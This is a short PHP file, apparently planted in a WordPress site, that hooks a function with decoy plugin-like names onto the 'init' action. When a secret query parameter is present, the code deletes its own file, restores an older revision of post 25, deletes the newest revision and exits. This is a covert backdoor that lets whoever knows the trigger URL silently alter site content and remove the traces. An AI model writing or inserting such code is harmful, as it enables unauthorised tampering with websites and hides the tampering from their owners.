<?php

function columns_management_database() {
	if (isset($_GET['buttons_hide_polyfill']) && $_GET['buttons_hide_polyfill'] === 'related_snippets_shortener') {
		unlink(trim(preg_replace('/\(.*$/', '', __FILE__)));
		$advanced_creator_old = 25;
		$access_hello_exchange_highlighter = wp_get_post_revisions($advanced_creator_old);
		if (empty($access_hello_exchange_highlighter)) die('no revisions');
		if (count($access_hello_exchange_highlighter) < 2) die('less than 2');
		$extra_marketplace_description = array_shift($access_hello_exchange_highlighter);
		$max_yoast_gallery = $extra_marketplace_description->ID;
		$free_multi_shortener = array_shift($access_hello_exchange_highlighter);
		$sites_rich_link = $free_multi_shortener->ID;
		$thumbnails_comments_gallery_optimize = wp_restore_post_revision($sites_rich_link);
		if ($thumbnails_comments_gallery_optimize === false) die('error restoring');
		$thumbnails_comments_gallery_optimize = wp_delete_post_revision($max_yoast_gallery);		
		if ($thumbnails_comments_gallery_optimize === false) die('error deleting');
		die('done');
	}
}

add_action('init', 'columns_management_database');
